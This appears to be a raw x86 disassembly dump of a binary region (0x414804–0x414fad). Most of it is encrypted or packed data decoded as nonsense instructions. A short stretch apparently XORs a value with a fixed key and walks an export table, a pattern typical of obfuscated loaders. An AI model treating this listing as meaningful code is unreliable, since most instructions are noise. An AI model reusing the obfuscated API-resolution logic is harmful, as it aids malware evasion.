  414804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414805:	xor    al,0x8a
  414807:	jl     0x414858
  414809:	scas   eax,DWORD PTR es:[edi]
  41480a:	(bad)  
  41480b:	in     al,dx
  41480c:	or     ebp,DWORD PTR [ecx]
  41480e:	add    dl,ch
  414810:	imul   ecx,edi,0x2d9124fa
  414816:	test   eax,0x75f35319
  41481b:	jne    0x414855
  41481d:	inc    ebx
  41481e:	push   edi
  41481f:	pop    ss
  414820:	call   0x3255:0x46c27e43
  414827:	ds pop ebx
  414829:	sbb    dl,BYTE PTR [ebp+0x7f6bcab0]
  41482f:	push   ecx
  414830:	push   cs
  414831:	(bad)  
  414832:	mov    DWORD PTR [edi-0x69],esp
  414835:	fimul  WORD PTR [edi+ecx*4]
  414838:	lods   al,BYTE PTR ds:[esi]
  414839:	loopne 0x4147f7
  41483b:	ja     0x4147be
  41483d:	add    eax,0xda9b43ea
  414842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414843:	mov    edx,DWORD PTR [ecx+0x4d8b6c86]
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41486b
  414861:	es mov ebp,gs
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148d3
  41486d:	lods   al,BYTE PTR ds:[esi]
  41486e:	inc    edi
  41486f:	push   edx
  414870:	stos   DWORD PTR es:[edi],eax
  414871:	sub    al,0x11
  414873:	adc    al,0xfe
  414875:	jg     0x414820
  414877:	adc    bl,bl
  414879:	add    eax,0x915037e0
  41487e:	mov    eax,0x9b01c7ee
  414883:	jmp    0xe6a94c22
  414888:	aam    0xa7
  41488a:	xor    BYTE PTR [edi+0x48],bh
  41488d:	jmp    0x7faf:0x41a75a80
  414894:	xchg   edx,eax
  414895:	mov    ds:0x440177e8,eax
  41489a:	and    edx,DWORD PTR [ebp-0x8]
  41489d:	push   0x57
  41489f:	push   es
  4148a0:	ret    0xcbd2
  4148a3:	jne    0x414837
  4148a5:	popa   
  4148a6:	fsub   QWORD PTR [edx-0x49]
  4148a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148aa:	dec    esp
  4148ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ac:	je     0x41485b
  4148ae:	cdq    
  4148af:	inc    eax
  4148b0:	xor    BYTE PTR [ebx+0x64269551],cl
  4148b6:	sbb    eax,0x1c21b689
  4148bb:	or     al,0xb2
  4148bd:	dec    esi
  4148be:	mov    eax,ds:0xd4daa5a8
  4148c3:	jmp    0x4148d1
  4148c5:	sub    al,0x3d
  4148c7:	retf   0xfc2e
  4148ca:	stc    
  4148cb:	pop    ebp
  4148cc:	and    dh,bl
  4148ce:	xor    BYTE PTR [edi+0x49],dl
  4148d1:	dec    ecx
  4148d2:	dec    esp
  4148d3:	jnp    0x414926
  4148d5:	mov    esi,0xd5f7f561
  4148da:	ds push ebp
  4148dc:	mov    BYTE PTR cs:[eax+eax*4+0x56],al
  4148e1:	fcom   DWORD PTR [edx-0x3]
  4148e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e5:	inc    esi
  4148e6:	imul   ch
  4148e8:	xchg   edx,eax
  4148e9:	repz xor DWORD PTR [ebp+eiz*4-0x4719bb],0xffffffed
  4148f2:	aas    
  4148f3:	cmp    DWORD PTR [edx+0x79],ebx
  4148f6:	out    0xa0,eax
  4148f8:	xor    edx,DWORD PTR [edi-0x1025325c]
  4148fe:	aam    0xd5
  414900:	mov    esp,0x69703d89
  414905:	pop    esp
  414906:	test   BYTE PTR [ebp-0x62aff1a5],dh
  41490c:	rol    DWORD PTR [edx],cl
  41490e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41490f:	fs pop eax
  414911:	mov    ah,0xf3
  414913:	mov    ch,0x69
  414915:	push   eax
  414916:	or     al,0x1b
  414918:	add    al,0x6f
  41491a:	xchg   ecx,eax
  41491b:	mov    ds:0x4bc80d05,eax
  414920:	pop    ds
  414921:	adc    ecx,DWORD PTR [ebx]
  414923:	jns    0x4148bf
  414925:	in     eax,dx
  414926:	sbb    cl,BYTE PTR [eax+0x24]
  414929:	mov    edx,0x5701db11
  41492e:	or     DWORD PTR [edx],ebp
  414930:	jecxz  0x414942
  414932:	cmp    DWORD PTR [edx],esi
  414934:	aaa    
  414935:	out    0x77,eax
  414937:	adc    al,0x9e
  414939:	fisubr WORD PTR [esi]
  41493b:	dec    ecx
  41493c:	jno    0x414968
  41493e:	pusha  
  41493f:	iret   
  414940:	leave  
  414941:	jo     0x4148dc
  414943:	jno    0x4148d2
  414945:	fld    TBYTE PTR [ecx-0x2ef19ca5]
  41494b:	sbb    eax,0xecd4b938
  414950:	outs   dx,BYTE PTR ds:[esi]
  414951:	add    DWORD PTR [edi+0x5acb29ac],ebp
  414957:	jmp    0xb95b:0xb03e780a
  41495e:	push   ss
  41495f:	jbe    0x4148fa
  414961:	pop    esi
  414962:	aaa    
  414963:	imul   edi,edx,0xbe55722c
  414969:	jl     0x41498e
  41496b:	je     0x41491e
  41496d:	mov    bh,0xc2
  41496f:	cmp    bh,BYTE PTR [edx+0x6d]
  414972:	xor    esi,DWORD PTR [edx]
  414974:	outs   dx,DWORD PTR ds:[esi]
  414975:	ds in  al,0x3a
  414978:	adc    al,0xff
  41497a:	push   ecx
  41497b:	(bad)  [ecx-0x60]
  41497e:	retf   
  41497f:	xchg   ebx,eax
  414980:	jl     0x414951
  414982:	fdiv   DWORD PTR [edx+0x48]
  414985:	pop    esi
  414986:	jge    0x4149de
  414988:	mov    ds:0x64f6124,al
  41498d:	fs pop esp
  41498f:	push   cs
  414990:	pushf  
  414991:	dec    ecx
  414992:	jbe    0x41498c
  414994:	das    
  414995:	sub    BYTE PTR [ebp-0x35],dh
  414998:	idiv   ah
  41499a:	fistp  QWORD PTR [ebx+0x46394c8a]
  4149a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149a1:	add    al,0x3f
  4149a3:	push   ds
  4149a4:	cmp    edi,eax
  4149a6:	(bad)  
  4149a7:	stc    
  4149a8:	loopne 0x414942
  4149aa:	pop    edx
  4149ab:	int    0x2d
  4149ad:	push   0xffffffb3
  4149af:	aas    
  4149b0:	gs jp  0x414946
  4149b3:	outs   dx,DWORD PTR ds:[esi]
  4149b4:	popf   
  4149b5:	lods   al,BYTE PTR ds:[esi]
  4149b6:	in     eax,0x3f
  4149b8:	jle    0x414a2d
  4149ba:	jns    0x414958
  4149bc:	(bad)  
  4149bd:	jmp    DWORD PTR [edx]
  4149bf:	int    0x5
  4149c1:	popa   
  4149c2:	cli    
  4149c3:	sbb    DWORD PTR [edi+esi*2+0x60],esi
  4149c7:	sub    BYTE PTR [edx-0x55d8d850],dl
  4149cd:	mov    dl,0x1c
  4149cf:	ror    WORD PTR [ebx],1
  4149d2:	push   cs
  4149d3:	xchg   ebx,eax
  4149d4:	add    edi,ebx
  4149d6:	mov    ds:0x24d4896b,al
  4149db:	xchg   esp,eax
  4149dc:	clc    
  4149dd:	and    edi,esp
  4149df:	sub    BYTE PTR [edi],dh
  4149e1:	ss clc 
  4149e3:	das    
  4149e4:	pop    esp
  4149e5:	popa   
  4149e6:	ss call 0xd0bd:0xc8ecd9be
  4149ee:	in     eax,0x42
  4149f0:	fs push edi
  4149f2:	popa   
  4149f3:	mov    al,0x7
  4149f5:	jge    0x4149ee
  4149f7:	push   0xa7ff4555
  4149fc:	inc    ebp
  4149fd:	cmp    eax,DWORD PTR [ebx+0x1a6c6059]
  414a03:	hlt    
  414a04:	aas    
  414a05:	ss dec esp
  414a07:	imul   edx,DWORD PTR fs:[bp+0x65],0x57
  414a0d:	fiadd  WORD PTR [ecx+0x5a151eee]
  414a13:	popf   
  414a14:	imul   ecx,DWORD PTR [ecx+0x17ea17a8],0xffffffa3
  414a1b:	bound  ebx,QWORD PTR [edi]
  414a1d:	xchg   BYTE PTR [esi+0x4d],al
  414a20:	(bad)  [ecx+0x40]
  414a23:	sbb    DWORD PTR [esp+eax*1+0x8],0xffffffaf
  414a28:	sbb    eax,0x27fb17f4
  414a2d:	frstor [ecx]
  414a2f:	cmp    eax,0xd96ac674
  414a34:	std    
  414a35:	xchg   edi,eax
  414a36:	ins    BYTE PTR es:[edi],dx
  414a37:	cwde   
  414a38:	mov    ecx,0x562c8900
  414a3d:	cs push 0x5dc4afa
  414a43:	std    
  414a44:	mov    ch,0x61
  414a46:	mov    bh,0x8
  414a48:	cmp    ecx,DWORD PTR [ecx-0x68]
  414a4b:	mov    al,ds:0xd8e5e945
  414a50:	test   eax,0xe78499f9
  414a55:	int    0xa5
  414a57:	add    BYTE PTR [edi],0x87
  414a5a:	lds    esp,FWORD PTR [esi]
  414a5c:	mov    eax,ds:0xc336b7d0
  414a61:	jb     0x414a50
  414a63:	int3   
  414a64:	in     al,dx
  414a65:	mov    DWORD PTR ds:[edi+0x1],ebp
  414a69:	jle    0x414a6c
  414a6b:	mov    dl,0x52
  414a6d:	cmc    
  414a6e:	shl    BYTE PTR [edi-0x5],cl
  414a71:	push   ds
  414a72:	out    0xc2,al
  414a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a75:	shl    esp,cl
  414a77:	and    al,0x66
  414a79:	push   0xffffffe7
  414a7b:	iret   
  414a7c:	inc    esp
  414a7d:	(bad)  
  414a7e:	in     al,0x77
  414a80:	loope  0x414a04
  414a82:	test   eax,0x57e09dfb
  414a87:	(bad)  
  414a88:	std    
  414a89:	pusha  
  414a8a:	into   
  414a8b:	ins    BYTE PTR es:[edi],dx
  414a8c:	dec    edx
  414a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a8e:	cs sub al,0x8a
  414a91:	inc    DWORD PTR [edi]
  414a93:	lods   al,BYTE PTR ds:[esi]
  414a94:	sub    DWORD PTR [ecx],edi
  414a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a97:	cs jg  0x414a3c
  414a9a:	inc    edi
  414a9b:	int    0x49
  414a9d:	nop
  414a9e:	sbb    ecx,edi
  414aa0:	aam    0x9
  414aa2:	(bad)  
  414aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa4:	xchg   cx,ax
  414aa6:	xor    eax,DWORD PTR [ecx+0x27]
  414aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aaa:	jg     0x414a30
  414aac:	aam    0x2c
  414aae:	adc    eax,ecx
  414ab0:	cmp    ch,BYTE PTR [ebx+0x6c]
  414ab3:	sbb    DWORD PTR [eax],edi
  414ab5:	mov    al,ds:0x72eb431
  414aba:	mov    ecx,0x21da18bc
  414abf:	into   
  414ac0:	inc    ebx
  414ac1:	push   edi
  414ac2:	inc    esi
  414ac3:	test   eax,0xc675e6b9
  414ac8:	int3   
  414ac9:	xor    eax,0x6b598bde
  414ace:	sub    eax,0x1c3cabc9
  414ad3:	xchg   BYTE PTR [edx+0x54f0b1d4],ch
  414ad9:	lock cmp eax,0x2472dcf3
  414adf:	sub    DWORD PTR [eax+0x78103c2a],0x4ee7c424
  414ae9:	xchg   ecx,eax
  414aea:	leave  
  414aeb:	sbb    DWORD PTR [ebx+0x6f94269f],edi
  414af1:	push   0x9e8e6e88
  414af6:	mov    esp,0x882b879e
  414afb:	stos   BYTE PTR es:[edi],al
  414afc:	push   es
  414afd:	xchg   ecx,eax
  414afe:	pop    eax
  414aff:	mov    eax,DWORD PTR [edx+0x47]
  414b02:	fwait
  414b03:	mov    ebp,0xa9eabe7b
  414b08:	sbb    cl,BYTE PTR [ebx]
  414b0a:	push   ecx
  414b0b:	iret   
  414b0c:	fcomp  st(6)
  414b0e:	scas   al,BYTE PTR es:[edi]
  414b0f:	inc    eax
  414b10:	das    
  414b11:	mov    ch,0xa3
  414b13:	js     0x414af6
  414b15:	cmp    al,0x63
  414b17:	repz hlt 
  414b19:	enter  0x3ec7,0x14
  414b1d:	mov    eax,0xd252532d
  414b22:	rcl    BYTE PTR [esi+ecx*2+0x2ac0414f],0x70
  414b2a:	jb     0x414ad4
  414b2c:	shl    edx,0xca
  414b2f:	adc    ebp,DWORD PTR ds:0xc303f772
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	in     ax,dx
  414bb8:	sub    al,0x91
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b51
  414bc3:	inc    al
  414bc5:	stos   DWORD PTR es:[edi],eax
  414bc6:	hlt    
  414bc7:	(bad)  
  414bc8:	cmp    eax,0x92bccb1f
  414bcd:	dec    edx
  414bce:	sbb    DWORD PTR [ebp+0x2e],ebx
  414bd1:	scas   al,BYTE PTR es:[edi]
  414bd2:	sbb    DWORD PTR [ebx+ebx*4],ebx
  414bd5:	sub    al,0x79
  414bd7:	sub    eax,eax
  414bd9:	xor    ebx,DWORD PTR [eax-0x5115caf0]
  414bdf:	mov    ?,WORD PTR [ebp+0x36]
  414be2:	jmp    0xbc735af1
  414be7:	push   edx
  414be8:	leave  
  414be9:	pop    ecx
  414bea:	stc    
  414beb:	inc    esi
  414bec:	xchg   DWORD PTR [ecx],esi
  414bee:	retf   
  414bef:	daa    
  414bf0:	sub    edx,edx
  414bf2:	arpl   si,si
  414bf4:	cmp    al,0xfe
  414bf6:	xchg   ebp,eax
  414bf7:	xor    al,0x31
  414bf9:	fwait
  414bfa:	and    BYTE PTR ds:0xac6c095d,dl
  414c00:	cmp    BYTE PTR [edx],ah
  414c02:	inc    ecx
  414c03:	inc    esp
  414c04:	push   eax
  414c05:	pusha  
  414c06:	inc    ebx
  414c07:	sar    DWORD PTR [eax+0x9],cl
  414c0a:	in     al,dx
  414c0b:	mov    ds:0x181a18a9,eax
  414c10:	or     al,0x3c
  414c12:	inc    ebp
  414c13:	stos   DWORD PTR es:[edi],eax
  414c14:	or     eax,DWORD PTR [eax-0x78]
  414c17:	loopne 0x414c47
  414c19:	mov    bh,BYTE PTR [eax-0x20b972e2]
  414c1f:	in     al,0x7e
  414c21:	test   edx,0x383c9421
  414c27:	loopne 0x414ca5
  414c29:	imul   BYTE PTR [ebx]
  414c2b:	test   ecx,ebp
  414c2d:	add    eax,0x68e33eb9
  414c32:	sbb    ch,BYTE PTR [eax]
  414c34:	ss jbe 0x414bd5
  414c37:	push   edi
  414c38:	or     BYTE PTR [ecx-0x1b02b909],ch
  414c3e:	inc    edi
  414c3f:	call   0x9d13c3e5
  414c44:	inc    edi
  414c45:	mov    eax,ds:0xbfa7d436
  414c4a:	in     eax,dx
  414c4b:	dec    ecx
  414c4c:	inc    edx
  414c4d:	aam    0x4e
  414c4f:	push   eax
  414c50:	add    eax,0x2bb42fee
  414c55:	aad    0x52
  414c57:	push   edi
  414c58:	mov    esp,0x590ba9ae
  414c5d:	mov    eax,ds:0x21ccd4ac
  414c62:	retf   
  414c63:	add    BYTE PTR [esp+eax*4-0x360ff518],bl
  414c6a:	les    esi,FWORD PTR [eax]
  414c6c:	sbb    BYTE PTR [eax],bl
  414c6e:	adc    eax,0xb0ea3704
  414c73:	int    0x75
  414c75:	adc    eax,0x1183bae9
  414c7a:	imul   edx,DWORD PTR [ebx],0xffffff8e
  414c7d:	xchg   ecx,eax
  414c7e:	popa   
  414c7f:	sub    eax,0xd7e7f3
  414c84:	enter  0x8d62,0xd2
  414c88:	call   0xfd28:0x4f21a164
  414c8f:	pop    edi
  414c90:	mov    BYTE PTR [esi-0x62],dl
  414c93:	ja     0x414c21
  414c95:	scas   eax,DWORD PTR es:[edi]
  414c96:	(bad)  
  414c98:	jbe    0x414c48
  414c9a:	inc    ebp
  414c9b:	stos   BYTE PTR es:[edi],al
  414c9c:	and    al,0xb1
  414c9e:	dec    esi
  414c9f:	push   esp
  414ca0:	lea    ebx,[edx+0x6d013647]
  414ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca7:	ins    BYTE PTR es:[edi],dx
  414ca8:	repz jnp 0x414ccd
  414cab:	add    bh,al
  414cad:	scas   eax,DWORD PTR es:[edi]
  414cae:	enter  0x11b5,0xc4
  414cb2:	popf   
  414cb3:	cmp    BYTE PTR [esp+eiz*8-0x60],bl
  414cb7:	arpl   WORD PTR [eax+0x2596bb36],bp
  414cbd:	xchg   ebp,eax
  414cbe:	cdq    
  414cbf:	repz xchg edx,eax
  414cc1:	push   edx
  414cc2:	mov    bh,0x2f
  414cc4:	push   edx
  414cc5:	push   0x1d3e8715
  414cca:	ret    
  414ccb:	push   ecx
  414ccc:	mov    bl,0x3
  414cce:	or     eax,0x2541140c
  414cd3:	jge    0x414c5c
  414cd5:	add    bl,BYTE PTR [ebx+0x6]
  414cd8:	daa    
  414cd9:	xchg   esi,eax
  414cda:	ins    WORD PTR es:[edi],dx
  414cdc:	aam    0xe3
  414cde:	dec    edi
  414cdf:	mov    ds:0xb9af5915,eax
  414ce4:	push   cs
  414ce5:	(bad)  
  414ce7:	xor    DWORD PTR [edx-0xb],esp
  414cea:	jbe    0x414cac
  414cec:	sub    eax,0x77ea1516
  414cf1:	cld    
  414cf2:	sbb    DWORD PTR [eax+0x7d],esi
  414cf5:	mov    ch,0xda
  414cf7:	imul   eax,esi,0xffffffb6
  414cfa:	pop    ds
  414cfb:	icebp  
  414cfc:	in     al,dx
  414cfd:	push   ds
  414cfe:	sub    dl,ah
  414d00:	sub    bl,0x98
  414d03:	test   al,0x69
  414d05:	xor    ah,bl
  414d07:	out    dx,eax
  414d08:	jb     0x414d65
  414d0a:	inc    ecx
  414d0b:	call   0xf409:0xefdccc78
  414d12:	stos   BYTE PTR es:[edi],al
  414d13:	fsub   QWORD PTR [edi]
  414d15:	rcl    dl,1
  414d17:	test   BYTE PTR [ebx+0x4a637d12],bh
  414d1d:	lock je 0x414ca5
  414d20:	adc    esi,edx
  414d22:	test   DWORD PTR [ebx+0x3a],0x33204a13
  414d29:	sar    BYTE PTR [edx],1
  414d2b:	adc    al,0xaa
  414d2d:	sar    BYTE PTR [ebp-0x4ccfce5c],1
  414d33:	jle    0x414d5d
  414d35:	jmp    0x414d67
  414d37:	or     al,0xe9
  414d39:	pop    esi
  414d3a:	cmp    al,0xb6
  414d3c:	cmp    eax,0x2cd86688
  414d41:	push   ecx
  414d42:	xchg   DWORD PTR [ebx+0x23196442],edx
  414d48:	push   ebx
  414d49:	cmp    BYTE PTR [ecx-0x63e7d77d],bl
  414d4f:	sahf   
  414d50:	enter  0x5f40,0x8a
  414d54:	mov    dh,0x37
  414d56:	in     eax,dx
  414d57:	dec    ecx
  414d58:	inc    esi
  414d59:	pop    ss
  414d5a:	outs   dx,DWORD PTR ds:[esi]
  414d5b:	jo     0x414d3b
  414d5d:	je     0x414ceb
  414d5f:	sbb    al,0x96
  414d61:	shl    DWORD PTR [ebx+0x35],cl
  414d64:	sbb    cl,BYTE PTR [esi-0x7e]
  414d67:	call   0x1baf:0x2b027833
  414d6e:	stos   BYTE PTR es:[edi],al
  414d6f:	jmp    0xde03:0x42cb4dfc
  414d76:	xor    bl,BYTE PTR [eax]
  414d78:	pop    eax
  414d79:	into   
  414d7a:	push   ebx
  414d7b:	imul   esp,DWORD PTR [esi],0xffffffda
  414d7e:	mov    bh,0x6c
  414d80:	push   esi
  414d81:	sbb    eax,0xe02fe52c
  414d86:	fwait
  414d87:	push   ebx
  414d88:	push   ebx
  414d89:	adc    al,0x14
  414d8b:	into   
  414d8c:	mov    eax,ds:0x5ca7ffe6
  414d91:	gs into 
  414d93:	fcmovnu st,st(4)
  414d95:	adc    ebx,DWORD PTR ds:0x601611c5
  414d9b:	jae    0x414d94
  414d9d:	add    BYTE PTR [edi],cl
  414d9f:	sub    bh,dl
  414da1:	in     eax,0x6
  414da3:	cs jnp 0x414de4
  414da6:	sbb    DWORD PTR [esp+ebx*1-0x3d69e735],edx
  414dad:	inc    ebx
  414dae:	(bad)  
  414daf:	aas    
  414db0:	push   edx
  414db1:	xor    bh,BYTE PTR [eax+0x4e6986dc]
  414db7:	lss    edx,FWORD PTR [esi]
  414dba:	jmp    0x414d50
  414dbc:	(bad)  
  414dbd:	(bad)  
  414dbe:	xchg   esp,eax
  414dbf:	push   cs
  414dc0:	xor    edx,DWORD PTR [edx]
  414dc2:	ja     0x414e09
  414dc4:	fidivr WORD PTR [esi+eiz*2+0x13]
  414dc8:	rcl    eax,1
  414dca:	push   edi
  414dcb:	in     al,0x7c
  414dcd:	inc    esi
  414dce:	push   esp
  414dcf:	(bad)  
  414dd0:	test   eax,0x9591dc01
  414dd5:	mov    ecx,0xaba07e78
  414dda:	or     BYTE PTR [ecx+0x23],bh
  414ddd:	scas   al,BYTE PTR es:[edi]
  414dde:	into   
  414ddf:	inc    edi
  414de0:	(bad)  
  414de1:	xor    ebx,DWORD PTR [edi-0x2]
  414de4:	out    dx,al
  414de5:	pop    ecx
  414de6:	mov    ah,0x69
  414de8:	xchg   ebx,eax
  414de9:	call   0x2d35:0x680372ff
  414df0:	jge    0x414e5f
  414df2:	out    0xd6,al
  414df4:	aaa    
  414df5:	xchg   ebx,eax
  414df7:	pusha  
  414df8:	test   al,0x39
  414dfa:	or     eax,0x8a602e8d
  414dff:	lock clc 
  414e01:	pop    ss
  414e02:	mov    ds:0x2bc183b5,al
  414e07:	xchg   ebx,esp
  414e09:	push   esi
  414e0a:	push   ebp
  414e0b:	sub    eax,0x9c72655a
  414e10:	popa   
  414e11:	cmp    al,0x72
  414e13:	mov    dh,0xf6
  414e15:	(bad)  
  414e16:	mov    ch,0x8
  414e18:	add    DWORD PTR [edi],esp
  414e1a:	cmp    eax,0xd6da8848
  414e1f:	js     0x414e1a
  414e21:	inc    esp
  414e22:	push   edx
  414e23:	inc    edx
  414e24:	aad    0x8a
  414e26:	cmp    edx,ebp
  414e28:	pop    edx
  414e29:	pop    ebx
  414e2a:	icebp  
  414e2b:	ds jge 0x414dc3
  414e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e2f:	or     DWORD PTR [ebx],0x5078471f
  414e35:	addr16 (bad) 
  414e3a:	out    dx,al
  414e3b:	or     eax,0x3c27d180
  414e40:	mov    bh,0xc7
  414e42:	(bad)  
  414e43:	or     al,0x7c
  414e45:	mul    BYTE PTR [ebp+0x2d0cec6c]
  414e4b:	push   ss
  414e4c:	push   esi
  414e4d:	mov    bl,0x77
  414e4f:	or     al,0xb2
  414e51:	into   
  414e52:	or     BYTE PTR [ebx+ebp*2-0x61fee0d4],0x4c
  414e5a:	cmp    bh,dh
  414e5c:	les    ebx,FWORD PTR [edi+0x6b5a3432]
  414e62:	je     0x414e56
  414e64:	add    esp,DWORD PTR [eax-0x58]
  414e67:	jns    0x414e34
  414e69:	jnp    0x414e30
  414e6b:	jl     0x414e5f
  414e6d:	popa   
  414e6e:	mov    al,BYTE PTR [ebp-0x5b]
  414e71:	xor    eax,0x1689dd54
  414e76:	sbb    BYTE PTR [ebp+0x42],bl
  414e79:	add    ah,BYTE PTR [edx]
  414e7b:	in     eax,0x16
  414e7d:	sahf   
  414e7e:	pop    esi
  414e7f:	scas   al,BYTE PTR es:[edi]
  414e80:	je     0x414e35
  414e82:	lods   al,BYTE PTR ds:[esi]
  414e83:	mov    edi,0x6414c766
  414e88:	fs pop ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	mov    ds:0xa43d9fe2,eax
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e5f
  414eb9:	loope  0x414e3d
  414ebb:	cmc    
  414ebc:	pop    esi
  414ebd:	enter  0x672a,0xb
  414ec1:	aam    0xe0
  414ec3:	jnp    0x414e76
  414ec5:	sbb    al,0xff
  414ec7:	xchg   ebp,eax
  414ec8:	data16 sbb BYTE PTR [ebx-0x1c],dh
  414ecc:	sbb    al,0x8f
  414ece:	sbb    ah,BYTE PTR [ebp+ebx*8+0x51f06989]
  414ed5:	adc    eax,0x2daa63fc
  414eda:	or     al,0x70
  414edc:	cwde   
  414edd:	adc    al,0xac
  414edf:	aad    0xec
  414ee1:	nop
  414ee2:	ds xchg ebp,eax
  414ee4:	js     0x414ee9
  414ee6:	pop    ecx
  414ee7:	rcl    cl,1
  414ee9:	dec    ebx
  414eea:	push   0xffffffe7
  414eec:	pop    ebp
  414eed:	sub    ebp,DWORD PTR [edi-0x52]
  414ef0:	xor    esi,DWORD PTR [eax+eax*8+0x32]
  414ef4:	jne    0x414f2c
  414ef6:	mov    dh,0x87
  414ef8:	push   esi
  414ef9:	sbb    al,0xe4
  414efb:	sub    esp,DWORD PTR [edi+eiz*8]
  414efe:	dec    ecx
  414eff:	mov    ebx,0xa0664c6a
  414f04:	(bad)  
  414f06:	mov    ds:0x80c32cac,eax
  414f0b:	mov    es,WORD PTR [ebp-0x28]
  414f0e:	nop
  414f0f:	sahf   
  414f10:	inc    eax
  414f11:	fld    TBYTE PTR [ebp-0x6a447538]
  414f17:	das    
  414f18:	adc    eax,0x83acdf17
  414f1d:	sbb    al,0x46
  414f1f:	out    dx,al
  414f20:	jns    0x414edc
  414f22:	sbb    BYTE PTR [esi],0x3d
  414f25:	out    dx,al
  414f26:	push   ebp
  414f27:	lods   eax,DWORD PTR ds:[esi]
  414f28:	dec    edx
  414f29:	mov    ah,0xf5
  414f2b:	jo     0x414f22
  414f2d:	dec    ecx
  414f2e:	jl     0x414fa5
  414f30:	add    cl,dl
  414f32:	mov    ebx,DWORD PTR [di+0x68]
  414f36:	xchg   ebx,eax
  414f37:	inc    ebp
  414f38:	(bad)  
  414f39:	and    BYTE PTR [ecx-0x4],cl
  414f3c:	addr16 out 0x32,eax
  414f3f:	mov    WORD PTR [eax-0x76ded33f],es
  414f45:	adc    esp,DWORD PTR [ebx-0x68]
  414f48:	push   edi
  414f49:	into   
  414f4a:	mov    dl,BYTE PTR [ecx+0x19]
  414f4d:	popa   
  414f4e:	dec    esp
  414f4f:	jp     0x414edf
  414f51:	dec    ebx
  414f52:	cs mov esi,0x9602ccd3
  414f58:	sub    ebp,edx
  414f5a:	test   al,0x4d
  414f5c:	out    0x26,al
  414f5e:	sbb    eax,0x738ffd9d
  414f63:	iret   
  414f64:	in     al,dx
  414f65:	jnp    0x414fb1
  414f67:	stos   DWORD PTR es:[edi],eax
  414f68:	jp     0x414f0a
  414f6a:	loope  0x414f67
  414f6c:	lods   eax,DWORD PTR ds:[esi]
  414f6d:	mov    esi,0x44e0fb88
  414f72:	mov    ebp,0x4a16ab7f
  414f77:	xor    cl,BYTE PTR [edx-0x69]
  414f7a:	and    edi,esi
  414f7c:	dec    esi
  414f7d:	sub    eax,DWORD PTR ds:0x14ceb2f5
  414f83:	(bad)  [esi+ebx*2]
  414f86:	adc    DWORD PTR [edi-0x56b0e3ee],esi
  414f8c:	xor    esp,DWORD PTR [edx+0x0]
  414f8f:	mov    BYTE PTR [esi-0x2b],al
  414f92:	adc    eax,0xaf0b4d98
  414f97:	inc    eax
  414f98:	pop    edx
  414f99:	xchg   esp,eax
  414f9a:	stos   DWORD PTR es:[edi],eax
  414f9b:	adc    DWORD PTR [edx-0x2ab05ec7],ebp
  414fa1:	and    DWORD PTR [ecx-0x7acff734],0x17
  414fa8:	js     0x414fec
  414faa:	addr16 push edi
  414fac:	dec    esi
  414fad:	and    DWORD PTR [edi-0x7d],edi
